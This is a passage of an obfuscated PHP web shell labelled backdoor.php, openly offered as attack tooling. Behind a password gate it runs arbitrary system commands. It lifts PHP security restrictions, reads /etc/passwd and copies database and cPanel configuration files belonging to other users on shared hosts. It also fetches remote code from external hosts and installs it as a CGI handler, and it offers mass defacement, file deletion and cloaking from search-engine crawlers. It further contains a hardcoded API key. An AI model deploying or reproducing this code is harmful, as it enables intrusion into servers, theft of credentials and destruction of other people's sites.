?><?php

/*
 * backdoor.php
 *
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.9
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
*/

session_start();
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '999999999M');
ini_set('zlib.output_compression', 'Off');
ini_restore('safe_mode');
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("open_basedir");
ignore_user_abort(0);

$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
$email = ""; // Your Email
$a="gzinflate";$b="urldecode";
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.a   |
    |              on 2018-07-14 06:40:43              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
 goto RONJU; nYmSZ: rjat_: goto d3Ydz; btcVT: kkcdS: goto NQAe_; tg5f0: $sep = substr("\\", 0, 1); goto Vdgxk; kN_m_: goto Jkk29; goto sdV4k; r7ZZ2: function YCCvm()
 {
     unset($_SESSION[sha1(md5($_SERVER["\110\124TP_\110\117S\124"]))]);
     tNbrl();
 } goto caYUZ; OxQua: function T9GAW($dir)
 {
     goto rGSEe;
     oTsgR: return false;
     goto dOqXE;
     SfZNS: UeiKt: goto hwrXH;
     vpb0e: Glu4S: goto VxLOU;
     VxLOU: return true;
     goto JVHLS;
     Ujnk2: $objects = scandir($dir);
     goto hQljB;
     wqXET: if (rmdir($dir)) {
         goto Glu4S;
     }
     goto oTsgR;
     gkXGl: goto j0rwF;
     goto nrEq1;
     ARqLA: return false;
     goto gkXGl;
     nrEq1: uE9BL: goto mtp1p;
     rGSEe: if (is_dir($dir)) {
         goto lKU15;
     }
     goto xpLDI;
     JVHLS: SXtP2: goto SfZNS;
     dOqXE: goto SXtP2;
     goto vpb0e;
     Zh6eT: j0rwF: goto GZvG5;
     hQljB: foreach ($objects as $object) {
         goto budPr;
         LtSXW: aMKwi: goto GTtJD;
         QqzVe: elOWy: goto LtSXW;
         budPr: if (!($object != "\56" && $object != "..")) {
             goto aMKwi;
         }
         goto cbpQr;
         xBJYw: MTHy7: goto tz20g;
         GTtJD: qEKeg: goto VagD9;
         IsfzD: unlink($dir . "/" . $object);
         goto R7fN0;
         R7fN0: goto elOWy;
         goto xBJYw;
         tz20g: T9Gaw($dir . "/" . $object);
         goto QqzVe;
         cbpQr: if (is_dir($dir . "\57" . $object)) {
             goto MTHy7;
         }
         goto IsfzD;
         VagD9:
     }
     goto UVhUT;
     xpLDI: if (@unlink($dir)) {
         goto uE9BL;
     }
     goto ARqLA;
     mtp1p: return true;
     goto Zh6eT;
     GZvG5: goto UeiKt;
     goto ZOVnu;
     UVhUT: f3rqz: goto wqXET;
     ZOVnu: lKU15: goto Ujnk2;
     hwrXH:
 } goto Y0_OA; UQWtE: JLdTe(); goto OMq5A; upQzj: function rtPa4($file)
 {
     goto Px6Gs;
     Px6Gs: if (@touch($file . "/" . "\156ew\137\146\151\154e\56p\150\160")) {
         goto KS_Er;
     }
     goto httHa;
     wabfW: jJIXG("Su\143\143\145ss");
     goto iLu0D;
     vvvgf: goto nN9Rs;
     goto Hs9vb;
     Hs9vb: KS_Er: goto wabfW;
     httHa: jJIXg("Pe\162\155\151\163\163ion \104\145\156\151\145\144\40O\162 F\151le\40\105\170\151\163\164\163");
     goto vvvgf;
     iLu0D: nN9Rs: goto CYx5y;
     CYx5y:
 } goto ndz_0; xqfOY: function NlYYO($url, $data)
 {
     goto WXSWo;
     O_hHL: curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     goto eaA9Q;
     AY2lw: curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     goto O_hHL;
     gciuZ: curl_close($ch);
     goto vKMjd;
     sdAE8: return curl_exec($ch);
     goto gciuZ;
     oUc22: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     goto AY2lw;
     eaA9Q: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     goto sdAE8;
     WXSWo: $ch = curl_init($url);
     goto oUc22;
     vKMjd:
 } goto r0gN3; WdgQ4: if ($_GET["\144\157"] == "\143\150m\157d" and isset($_GET["\146i\154\145\163"])) {
     goto Vb10t;
 } goto CHviX; XyLTN: function c5s6G()
 {
     jJiXg("T\150\151s f\145\141\164u\162e\40\165n\144\145r\40d\145\166\145\154o\160m\145n\164");
 } goto dmbX9; eVXgr: jjiXg("Su\143\143es\163"); goto Db0q_; Hz6Gx: Vqggv: goto eptYg; lXYhF: luKGR: goto DdRy8; MBMaY: ByHtq: goto tg5f0; pwCJW: if (!isset($_GET["do"])) {
     goto gJTfH;
 } goto zNXEM; r1s0N: if (!isset($_POST["u\160l"])) {
     goto rea3J;
 } goto AhvnH; EI6yV: if ($_GET["d\157"] == "ed\151\164" and isset($_GET["\146\151\154e\163"])) {
     goto t30L2;
 } goto M29w9; h0DV_: X06oR: goto rcxk9; Eld8r: goto Jkk29; goto wi8wr; deCzC: function u4Tux($cmd)
 {
     goto HHE7A;
     exPGa: $buff = ob_get_contents();
     goto m2qV5;
     m71US: QEIHb: goto aEyU8;
     xg7TK: return $buff;
     goto ivo_o;
     tCvMQ: $buff = ob_get_contents();
     goto bXPMc;
     HHE7A: if (function_exists("\163\171stem")) {
         goto QEIHb;
     }
     goto UPb81;
     MWvMT: if (function_exists("p\141ssth\162u")) {
         goto WuyA0;
     }
     goto LoMNq;
     ivo_o: goto Rj53k;
     goto RAC4_;
     WqYQI: $buff = '';
     goto Ys0NG;
     KohO_: goto Rj53k;
     goto URVjO;
     yk4I0: ob_start();
     goto Kncsc;
     UPb81: if (function_exists("\145\170ec")) {
         goto pvB0k;
     }
     goto MWvMT;
     m2qV5: ob_end_clean();
     goto zLlk6;
     Rxtqg: Rj53k: goto gkoLd;
     aEyU8: ob_start();
     goto yduGd;
     URVjO: pvB0k: goto e8wFJ;
     yduGd: @system($cmd);
     goto tCvMQ;
     hcaWn: return $buff;
     goto KohO_;
     zLlk6: return $buff;
     goto xIQCq;
     e8wFJ: @exec($cmd, $results);
     goto WqYQI;
     bXPMc: ob_end_clean();
     goto hcaWn;
     Kncsc: @passthru($cmd);
     goto exPGa;
     RAC4_: WuyA0: goto yk4I0;
     W4kqk: ZZcML: goto xg7TK;
     x5kd8: lp_ro: goto f8Vil;
     Oc21i: goto Rj53k;
     goto m71US;
     LoMNq: if (function_exists("\163h\145l\154_exe\143")) {
         goto lp_ro;
     }
     goto Oc21i;
     f8Vil: $buff = @shell_exec($cmd);
     goto jGKpC;
     xIQCq: goto Rj53k;
     goto x5kd8;
     Ys0NG: foreach ($results as $result) {
         $buff .= $result;
         pXz1I:
     }
     goto W4kqk;
     jGKpC: return $buff;
     goto Rxtqg;
     gkoLd:
 } goto bBZU9; SmrFX: echo "\74\164\141\142l\145\40w\151\144t\150='7\60%\47 cel\154p\141dd\151\156g\75'3\47\40\143e\154\154\163pa\143i\156\147\75'\63' \141\154i\147\156='\143\145\156ter\47 st\171\154\145\75\47ba\143kgr\157und:\147\162e\145\156\73\47>\xd\xa\x9\74\164h\40s\164yl\145='b\141c\153g\162\157un\144\72g\162e\145\156\73f\154oa\164\72l\145\146\164\73\167\151\144\164h:\62\60\60\160x;\164\145xt-\141\154i\147n:c\145\156\164\145r;fo\156\164-size\72\61\70\160x\73\47\76N\141me<\57\164\150>\15\xa\x9\74\164\150 st\171\154e\75\47ba\143\153\147\162o\165\156\144:\147ree\156;flo\141\164\72r\151ght;w\151dt\150\72\6300\160\170\73te\170t-\141lign:\143\145nte\162;f\157n\164-size:1\70p\170\73\47>\101c\164i\157\156\74/\164h\76\xd\12\11\74\57t\141\142l\145>"; goto gcOHE; qkQRD: UeqDA($_GET["fi\154e\163"]); goto v1W3k; WoElu: if ($_GET["d\157"] == "\154\157go\165t") {
     goto mIQb1;
 } goto EI6yV; tK6jq: cVxIB: goto AmxkD; aaD85: if ($_GET["d\157"] == "v\151\145w" and isset($_GET["\146\151l\145s"])) {
     goto Vqggv;
 } goto wxaII; OPU8D: UdMDI: goto H2Oo2; VGEHJ: goto Jkk29; goto s63LX; QjL6a: ?>, 
			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
			</center>
		</th>
	</table>
	<?php  goto r1s0N; g8_oj: goto Jkk29; goto SLwwz; xtMZ1: goto Jkk29; goto iUmx7; rcxk9: ?>
<table width='70%' cellpadding='3' cellspacing='3' align='center'
		style='background: green;'>
		<th style='padding: 5px;' colspan='2'>
			<center>
			Copyright &copy <?php  goto OI4ds; s5SwB: goto yTl53; goto MBMaY; eXMF4: if (empty($auth_pass) or isset($_GET["pa\163s"]) and sha1($_GET["p\141s\163"]) == $auth_pass) {
     goto kkcdS;
 } goto GP2Ek; v1W3k: goto Jkk29; goto OPU8D; RONJU: if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
     goto ByHtq;
 } goto wb8wZ; HyKF2: $userAgents = array("G\157\157\147le\142ot", "Duck\104uckB\157t", "\102a\151\144\165\163p\151\144\145\162", "E\170a\142\157\164", "S\151m\160\154e\120i\145", "\103\165rl", "Ok\110\164t\160", "Sit\145Lo\143\153S\160\151\144\145\162", "BL\105\130\102\157\164", "S\143out\112e\164", "A\144sB\157\164\40G\157\157\147\154e \115\157\142il\145", "G\157\157glebot\40\115obile", "\115\1121\62\142\157t", "Slu\162\160", "M\123\116B\157t", "PycU\122\114", "\146\141\143e\142\157oke\170t\145\162\156\141\154\150\151\164", "fa\143e\142\157t", "ia_a\162\143h\151v\145\162", "\143\162\141w\154er", "Y\141\156\144exB\157t", "Ra\155bl\145r", "\131ah\157\157! Slur\160", "Ya\150\157\157S\145\145ker", "\142\151\156g\142ot"); goto KJTqW; dV0jz: function cbVC0()
 {
     goto GFcyl;
     QcIXx: echo php_uname();
     goto GYeve;
     kGeuX: die;
     goto OBGBj;
     ep4I3: goto ymYKL;
     goto XWnvJ;
     SUtMs: echo $dist;
     goto sfbWA;
     GYeve: ?></h5>
   	<h5>Disabled Function : <?php  goto SUtMs;
     sfbWA: ?> </h5>
		<textarea class="form-control" id="textarea" readonly /><?php  goto Nt9wV;
     XWnvJ: ycc4S: goto uEafZ;
     EbTWn: ymYKL: goto aW13r;
     Nt9wV: var_dump($_SERVER);
     goto QH5QB;
     aW13r: ?>
   <center>
   	<h5><?php  goto QcIXx;
     QH5QB: ?></textarea>
	</center>
	<?php  goto kGeuX;
     GFcyl: if (!ini_get("\144is\141bl\145_fu\156ctio\156s") == true) {
         goto ycc4S;
     }
     goto DviOr;
     uEafZ: $dist = "\106\141l\163\145";
     goto EbTWn;
     DviOr: $dist = ini_get("\144i\163\141\142\154e_f\165\156c\164io\156s");
     goto ep4I3;
     OBGBj:
 } goto r7ZZ2; wdnHz: JjiXG("P\145rm\151\163sio\156\40\104\145\156\151\145d"); goto VHd9t; dmbX9: function M4L6u()
 {
     goto Ak3zR;
     rsXtg: if (file_exists("\57\150o\155e\57")) {
         goto kJrdD;
     }
     goto OzNJK;
     Ua_R2: Tg27Y: goto nI_uO;
     LODfv: $isi = "Op\164i\157\156s \106\157\154\154\157wS\171m\114\151n\153s MultiViews In\144\145x\145s\40E\170\145cCG\111\xaRequir\145 N\157\156e\12S\141t\151s\146y A\156y\12Ad\144T\171p\145 \141\160\160\154\151c\141t\151\157\156\57\170-h\164\164pd-\143\147\151 \56ci\156\12Add\110\141n\144l\145r\40cg\151-s\143r\151pt .c\151\156\12\101\144d\110\141ndl\145r \143gi\55s\143ri\160t\40\56ci\156";
     goto iNOBI;
     iNOBI: file_put_contents(".config/co\156f\151g/\56h\164ac\143\145s\163", $isi);
     goto TorFm;
     tPg0v: goto Tg27Y;
     goto QuWHU;
     hQktX: gFARi: goto VSauv;
     BduKY: IO8Nu: goto eex5v;
     wmhcH: $home = "\150o\155e4";
     goto Ua_R2;
     QuWHU: cwJVz: goto wmhcH;
     VSauv: if (!($passwd = fgets($etc))) {
         goto WV6Zq;
     }
     goto wzmbC;
     f6J2e: mkdir("\56c\157n\146\151g/\143onf\151\147");
     goto vr7ZA;
     pP06I: bnzLN: goto mfCIf;
     JG_9r: echo "<\143e\156\164\145\162><\141 h\162ef='{$link_config}/.\143onf\151\147/co\156\146i\147\57vh\157\163t\56\143i\156\47><fon\164\40\143\157lor\75\154\151m\145>D\157ne<\57f\157\156\164\76</\141\76</\143\145\156\164er>";
     goto pMxKQ;
     KakQ6: goto bnzLN;
     goto XMpAh;
     Vyec4: if (u4tUX("\143\144\40.\143\157n\146\151\147/\143o\156\146\151g \46& ./\166ho\163t\56c\151n")) {
         goto IO8Nu;
     }
     goto JG_9r;
     OzNJK: if (file_exists("\57\150\157\155e1\57")) {
         goto Bvgm7;
     }
     goto OdMNm;
     B_MeU: goto Tg27Y;
     goto MNyni;
     oV5jb: die;
     goto q0JDw;
     eex5v: echo "<\143ente\162><a \150r\145\146='{$link_config}\57\56\143\157\156\146\151g/\143\157nfig\47>\74fo\156\164\40\143ol\157r\75\154im\145>\104one</\146\157n\164></a><\57\143\145\156\164\145r>";
     goto nnl4_;
     MNyni: Bvgm7: goto P8KDl;
     wzmbC: if ($passwd == '' || !$etc) {
         goto M6tem;
     }
     goto sYLvU;
     pMxKQ: goto t3kfc;
     goto BduKY;
     fk0e9: goto Tg27Y;
     goto lpYqO;
     MoJPT: if (preg_match("\57\166\150osts\174v\150\157st\57", $dir)) {
         goto mB6Sg;
     }
     goto xKtfe;
     XMpAh: M6tem: goto XJgNj;
     FUVkt: mkdir("\56\143\157nf\151\147");
     goto lXP2I;
     A3037: uHAaP: goto h9kjN;
     vr7ZA: xDzyC: goto yB9mC;
     Bgo0y: goto Tg27Y;
     goto z9HDY;
     nK_4g: if (file_exists("\57ho\155\1454/")) {
         goto cwJVz;
     }
     goto fk0e9;
     cUevT: if (file_exists("/\150om\1453/")) {
         goto uHAaP;
     }
     goto nK_4g;
     JwFiN: WV6Zq: goto hXynT;
     h9kjN: $home = "h\157\155\145\63";
     goto tPg0v;
     dSNBE: if (file_exists("\56c\157nfi\147")) {
         goto wSPhj;
     }
     goto FUVkt;
     Un6V2: if (file_exists(".\143\157n\146i\147\57con\146\151\147\57v\150o\163t.\143\151\156")) {
         goto s4Lcz;
     }
     goto NgLGv;
     z9HDY: IcGxH: goto SbNtR;
     nnl4_: t3kfc: goto HsGay;
     NgLGv: file_put_contents(".c\157nf\151g/co\156f\151g/\166ho\163\164.\143in", gzinflate(urldecode(file_get_contents("\150\164\164ps:/\57c\166\141r1\718\64\56\147\151t\150u\142.io\57\166hos\164.cin"))));
     goto pUkc7;
     nI_uO: foreach ($user_config[1] as $user_idx) {
         goto Bpbnk;
         Bpbnk: $user_config_dir = "\57{$home}\57{$user_idx}/\160\165\142\154ic\137\150t\155\154";
         goto zfuCW;
         NRptc: $grab_config = array("/{$home}/{$user_idx}\57.\155\171\56c\156f" => "c\160an\145\154", "/{$home}/{$user_idx}\57.ac\143e\163\163ha\163\150" => "\127\110\115-\141\143\143\145\163sha\163\150", "{$user_config_dir}/po-c\157\156te\156t\57\143onf\151g.\160h\160" => "\120\157\160oj\151", "{$user_config_dir}/\166do_\143\157n\146i\147.p\150\160" => "Voo\144\157o", "{$user_config_dir}\57b\167\55\143\157n\146ig\163/c\157\156\146i\147.in\151" => "Bos\127eb", "{$user_config_dir}\57con\146ig\57\153o\156eks\151.\160\150\160" => "Lo\153\157media", "{$user_config_dir}/l\157komed\151\141/\143\157\156fig\57kon\145\153si.php" => "\114\157k\157\155ed\151a", "{$user_config_dir}\57kon\145\153si.ph\160" => "Lok\157m\145\144\151\141", "{$user_config_dir}/cl\151e\156\164ar\145a\57\143o\156f\151\147ur\141\164\151on.p\150p" => "WH\115\103\123", "{$user_config_dir}/whm/co\156\146\151g\165\162\141ti\157\156.\160hp" => "\127\110M\103S", "{$user_config_dir}/wh\155\143\163/\143o\156\146igu\162a\164i\157\156.p\150p" => "\127\110MCS", "{$user_config_dir}\57f\157\162\165m/co\156f\151g.\160hp" => "\160\150\160\102\102", "{$user_config_dir}/site\163/\144\145\146au\154\164\57\163etti\156\147s\56p\150\160" => "Drup\141l", "{$user_config_dir}/c\157\156\146ig\57\163et\164ing\163.\151nc\56ph\160" => "\120\162es\164a\123\150o\160", "{$user_config_dir}\57app\57\145tc/\154\157\143a\154.\170ml" => "\115\141gen\164\157", "{$user_config_dir}/\152o\157m\154\141\57config\165r\141ti\157\156.php" => "J\157omla", "{$user_config_dir}\57\143\157\156\146\151\147\165r\141ti\157\156.\160\150\160" => "J\157o\155\154\141", "{$user_config_dir}/wp/w\160\55co\156f\151g.\160\150\160" => "Wor\144\120\162es\163", "{$user_config_dir}\57\167\157\162d\160\162\145\163\163\57w\160-\143\157\156fi\147\56php" => "W\157\162\144\120ress", "{$user_config_dir}/\167\160\55\143o\156\146\151g\56p\150p" => "\127\157\162d\120\162e\163\163", "{$user_config_dir}/\141d\155i\156\57c\157\156f\151\147.p\150p" => "\117pe\156C\141\162\164", "{$user_config_dir}\57s\154\143o\156fi\147.\160\150p" => "S\151t\145lok", "{$user_config_dir}\57\141\160\160\154\151c\141\164\151o\156/co\156fi\147/\144\141tab\141\163e.\160\150p" => "El\154is\154a\142", "{$user_config_dir}/co\156f\151\147\57\144ata\142ase.p\150p" => "Ellislab", "{$user_config_dir}/\155\157\144els/\144b-\163\145\164t\151n\147s.\160hp" => "\125\163\145\162\143\141k\145", "{$user_config_dir}/con\146\151g/\144a\164\141bas\145.\160\150\160" => "L\141\162a\166\145\154", "{$user_config_dir}\57dat\141\142as\145\56p\150\160" => "Lar\141v\145l", "{$user_config_dir}\57\141\160p\154i\143a\164\151on\57\143\157\156f\151g.i\156i" => "\132\145nd", "{$user_config_dir}/\143on\146i\147/\141pp.ph\160" => "C\141k\145P\110\120", "{$user_config_dir}/ph\141\154\143\157\156\57con\146i\147\57adapter/\151\156i.z\145p" => "Ph\141\154\143\157\156", "{$user_config_dir}\57\143\157\156f\151g\57\141\144ap\164\145r\57\151\156\151\56ze\160" => "P\150\141\154\143\157\156", "{$user_config_dir}/a\160p\57\143on\146\151\147\57c\157\156fig\165\162\141tio\156.yml" => "Sym\160h\157n\171", "{$user_config_dir}\57\141pp\57\143\157n\146\151g\57\144\141\164abas\145\163.y\155\154" => "\123\171\155p\150ony", "{$user_config_dir}\57\143\157n\146i\147\57\143\157n\146igu\162a\164ion\56\171\155\154" => "S\171\155p\150ony", "{$user_config_dir}\57\143o\156\146ig\57da\164\141b\141ses.yml" => "S\171\155p\150o\156y", "{$user_config_dir}\57\143\157\156f\151\147/\144\142\56p\150p" => "F\165e\154\120\110\120 &\40\131ii\62", "{$user_config_dir}/\163rc/se\164\164\151n\147\163\56\160\150p" => "\123l\151\155");
         goto Ykra6;
         zfuCW: if (!is_readable($user_config_dir)) {
             goto eZJEp;
         }
         goto NRptc;
         qNg1S: eZJEp: goto ompfy;
         ompfy: LvSfc: goto ZVHb0;
         lvffG: V6ibd: goto qNg1S;
         Ykra6: foreach ($grab_config as $config => $nama_config) {
             goto FgYUs;
             tru78: fclose($file_config);
             goto Z2_kQ;
             H6Pnu: if (empty($ambil_config)) {
                 goto rph89;
             }
             goto RWIwH;
             RWIwH: $file_config = fopen(".con\146\151\147/\143o\156\146\151\147\57{$user_idx}-{$nama_config}\56\164x\164", "w");
             goto Z227f;
             Z2_kQ: rph89: goto st3D0;
             Z227f: fputs($file_config, $ambil_config);
             goto tru78;
             st3D0: n2vT2: goto Ycg4y;
             FgYUs: $ambil_config = @file_get_contents($config);
             goto H6Pnu;
             Ycg4y:
         }
         goto lvffG;
         ZVHb0:
     }
     goto CsoN6;
     lpYqO: kJrdD: goto HMD0q;
     hXynT: echo "\74\143ente\162>\74a\40h\162\145f\75\47\77do\75\157p\145\156&\144\151\162\75" . getcwd() . $sep . $dir . "/\56conf\151g\57\143on\146\151\147'\76\104\157\156\145\74/a>\74/\143ent\145\162\76";
     goto TTX38;
     mfCIf: goto gFARi;
     goto JwFiN;
     B4veG: mB6Sg: goto sl9kw;
     TTX38: goto vBRCY;
     goto B4veG;
     sYLvU: preg_match_all("/(.\52\77)\72x:\57", $passwd, $user_config);
     goto rsXtg;
     tyQXN: goto Tg27Y;
     goto A3037;
     P8KDl: $home = "\150o\155\1451";
     goto Bgo0y;
     lXP2I: wSPhj: goto LuI8m;
     HMD0q: $home = "home";
     goto B_MeU;
     LuI8m: if (file_exists(".co\156\146\151g/con\146ig")) {
         goto xDzyC;
     }
     goto f6J2e;
     OdMNm: if (file_exists("\57\150\157me\62/")) {
         goto IcGxH;
     }
     goto cUevT;
     sl9kw: $link_config = str_replace($_SERVER["\104\117\103\125M\105NT\137\122OOT"], '', $dir);
     goto Un6V2;
     yB9mC: if (file_exists("\56\143o\156fi\147\57c\157\156\146\151g\57.\150t\141\143c\145\163\163")) {
         goto e3Urw;
     }
     goto LODfv;
     Ak3zR: global $dir;
     goto dSNBE;
     HsGay: vBRCY: goto oV5jb;
     SbNtR: $home = "h\157me2";
     goto tyQXN;
     xKtfe: $etc = @fopen("\57\145t\143/\160a\163\163w\144", "\162") or die("<\160re><font col\157r\75\162\145d\76\103a\156'\164\40re\141\144\40/etc\57\160\141ss\167\144\74/font\76\74/\160\162e>");
     goto hQktX;
     CsoN6: U7w25: goto KakQ6;
     XJgNj: echo "<\146\157\156t \143ol\157r\75\162\145\144\76\103\141\156'\164\40\162\145\141d \57\145\164c\57pass\167\144<\57f\157nt>";
     goto pP06I;
     TorFm: e3Urw: goto MoJPT;
     pUkc7: s4Lcz: goto Vyec4;
     q0JDw:
 } goto SoADm; pxJ_h: function A4P0t()
 {
     goto YM1YN;
     t4VZ2: curl_close($ch);
     goto Tx4K9;
     s2Om1: curl_setopt($ch, CURLOPT_HTTPHEADER, array("Con\164e\156t\55\164ype:ap\160l\151c\141\164io\156/\152son"));
     goto N7oWo;
     Tx4K9: $json = json_decode($response);
     goto c5lwm;
     jtCAX: $post = array("l\157ng\125r\154" => $_POST["\154\151nk"]);
     goto ggrzt;
     gwOV0: ?>
<form method='post'>
	<table align="center">
		<tr>
			<td>Link</td>
			<td>:</td>
			<td>
				<input type='text' class='input-sm' id='input' name='link'>
			</td>
		</tr>
	</table>
	<center>
		<br />
		<input type='submit' class='btn btn-danger' name='action'>
	</center>
</form>
<?php  goto CR_ra;
     YM1YN: $mykey = "AIzaSyDKvTCs\130X3V\151\160b\161\171\150\152\63a\60JH\61D3JY\115\165\102\65V\115";
     goto spoX_;
     PgsXr: $param = "h\164t\160\163:\57/\167\167w\56g\157\157gle\141p\151s.\143\157\155\57u\162\154s\150\157rt\145\156\145r/\1661\57url?k\145\171\75{$mykey}";
     goto jtCAX;
     c5lwm: if (isset($json->error)) {
         goto Qrm00;
     }
     goto GNigg;
     U9Fu1: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     goto rez4Z;
     ggrzt: $jsondata = json_encode($post);
     goto K8VEb;
     GNigg: echo "\74\143en\164\145r><\164\145\170t\141r\145\141 i\144\75\47\164ex\164\141\162ea\47 \143la\163\163='\146\157rm\55c\157\156\164\162ol' \162\145\141\144onl\171\76" . $json->id . "<\57te\170\164area></\143\145nt\145r>";
     goto lZxZH;
     mGuup: if (!isset($_POST["\141\143\164\151on"])) {
         goto Ulh3s;
     }
     goto PgsXr;
     og7zG: LNads: goto pQu0I;
     lZxZH: goto LNads;
     goto H9LME;
     rez4Z: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     goto wlblg;
     H9LME: Qrm00: goto jDMpP;
     K8VEb: $ch = curl_init();
     goto fN8BU;
     CR_ra: die;
     goto Ruels;
     wlblg: curl_setopt($ch, CURLOPT_HEADER, 0);
     goto s2Om1;
     N7oWo: curl_setopt($ch, CURLOPT_POST, 1);
     goto HDn9R;
     spoX_: echo "<c\145\156ter\76\74h\62\76\123\150or\164lin\153 Gener\141\164o\162<\57\1502\76</\143\145nt\145r>";
     goto mGuup;
     fN8BU: curl_setopt($ch, CURLOPT_URL, $param);
     goto U9Fu1;
     pQu0I: Ulh3s: goto gwOV0;
     P7_hf: $response = curl_exec($ch);
     goto t4VZ2;
     jDMpP: echo $json->error->message;
     goto og7zG;
     HDn9R: curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
     goto P7_hf;
     Ruels:
 } goto cxDMj; lYqT1: if ($_GET["do"] == "re\156a\155\145" and isset($_GET["\146\151\154es"])) {
     goto yc9Lm;
 } goto WdgQ4; H2Oo2: glSbX(); goto eCp7p; eCp7p: goto Jkk29; goto aZCmH; YVxpL: goto Jkk29; goto xoXtw; wc7Yd: if (empty($_SERVER["\110T\124P\137USE\122\137A\107\105\116T"])) {
     goto S1ihE;
 } goto HyKF2; IxX6P: if ($_GET["do"] == "new" and isset($_GET["\144ir"])) {
     goto luKGR;
 } goto BWB1O; KJTqW: if (!preg_match("/" . implode("|", $userAgents) . "/\151", $_SERVER["HTT\120_USE\122_\101GEN\124"])) {
     goto vdcmX;
 } goto tZReq; qmWpE: BV2P6: goto K88AD; rgZdR: function l1Zr1()
 {
     goto z7st_;
     S4MHk: echo "\74i\146\162\141me \163r\143='.\143o\156\146\151g/c\147\151.iz\157\47 \143\154as\163='i\146r\141\155e'\40f\162ame\142o\162\144er\75\47\60\47\40\163\143r\157l\154ing\75'\156o\47\76\74/\151f\162a\155e\76";
     goto NQ0Up;
     vW9z5: nyO53: goto pGSPU;
     NQ0Up: die;
     goto ff8Bk;
     NkBn1: file_put_contents(".co\156fig/\56\150tacc\145\163s", "A\144\144\110\141ndl\145r\40cg\151\55\163cr\151\160\164\40.i\172\157\xaO\160t\151\157\156\163\40-Ind\145\170\145s");
     goto hy0RM;
     p4fdd: if (file_exists("\56\143on\146i\147")) {
         goto nyO53;
     }
     goto soI4a;
     vi13A: vbkQf: goto j5Otn;
     hy0RM: file_put_contents("\56\143onfig/\143g\151\56i\172\157", file_get_contents("h\164\164p\163:\57/\160a\163\164e\142i\156\56com\57raw\57\115\125\104\60\105\120j\142"));
     goto fj69F;
     ff8Bk: goto vbkQf;
     goto yRwnt;
     soI4a: mkdir("\56\143\157\156\146\151g");
     goto vW9z5;
     qjjJg: jjIxg("\124\150\151s\40f\165ncti\157n n\157\164 avai\154abl\145\40f\157r W\151\156\144\157w\163 s\145rv\145\162");
     goto vi13A;
     fj69F: n7cKs: goto S4MHk;
     rMii0: if ($os == "W\151\156\144ows") {
         goto zqdgc;
     }
     goto p4fdd;
     z7st_: global $os;
     goto rMii0;
     pGSPU: if (file_exists("\56\143\157n\146i\147/\143\147i.\151zo") and file_exists("\56co\156\146i\147/.ht\141c\143\145\163\163")) {
         goto n7cKs;
     }
     goto NkBn1;
     yRwnt: zqdgc: goto qjjJg;
     j5Otn:
 } goto s08OF; Vdgxk: $os = "W\151ndo\167\163"; goto Jwoo0; v0HnU: rtPa4($_GET["fi\154\145s"]); goto Eld8r; K88AD: CbVc0(); goto OHqrl; pSWnp: rea3J: goto Y4e5u; k0mSL: if ($_GET["do"] == "in\146o") {
     goto BV2P6;
 } goto WoElu; xoXtw: Vb10t: goto qkQRD; g5XV0: goto Jkk29; goto a20F6; fP0qQ: if ($_GET["\144\157"] == "s\155\163") {
     goto vL5pr;
 } goto Vw1Hz; n4U_N: zS3q1: goto qkhAz; SoADm: function gyZGO()
 {
     JjIxG("Thi\163\40f\145\141ture\40u\156d\145\162\40dev\145l\157\160\155en\164");
 } goto dV0jz; SLwwz: zV8YQ: goto Fhp6L; Linvc: if ($_GET["\144\157"] == "mas\163_d\145\146\141ce") {
     goto CR3t3;
 } goto k0mSL; WkBOZ: mIQb1: goto d_edT; BZ_hd: if (!function_exists("\146ile\137\147\145t_\143onte\156ts")) {
     echo "<sc\162ipt>\141l\145rt\50'\146\151l\145\137g\145\164_\143\157\156tent\163 \146u\156c\164\151\157\156 \144\151sabled\54\40t\150\151\163 we\142\163h\145\154l \156ot\40\167\157\162\153\151\156g\40pr\157pe\162\154y\47)\74\57s\143r\151p\164>";
 } goto nLbsJ; L1bpu: goto N4hON; goto tK6jq; gRcNX: N4hON: goto pSWnp; ANdEW: CR3t3: goto aux2O; ThQCb: Jkk29: goto iVxP2; JfUXZ: if (isset($_SESSION[sha1(md5($_SERVER["H\124\124\120_H\117ST"]))])) {
     goto rjat_;
 } goto eXMF4; sdV4k: yc9Lm: goto nENXh; Jwoo0: yTl53: goto wc7Yd; OHqrl: goto Jkk29; goto WkBOZ; a20F6: q7lM0: goto lsPIc; r0gN3: function TnBrl()
 {
     echo "\74s\143\162\151\160\164\76wi\156\144o\167\56\154oc\141\164\151\157n\75'?\47;<\57s\143ript\76";
 } goto OxQua; G7bgQ: goto Jkk29; goto uZ0y4; iVxP2: gJTfH: goto pDr2s; Sp_ot: if (empty($email)) {
     goto zS3q1;
 } goto qdGnG; gcOHE: foreach ($dir as $dir) {
     goto Z6Vib;
     EDggY: echo "\74\164d\76\74\151\155\147\40src\75\47ht\164ps:\57/\143v\141\162\6198\64.\147\151\164\150\165\142.i\157/\164e\170t\55\160\154\141\151n\55i\143\157n\56pn\147' \143\154as\163='\151\143o\156'\76";
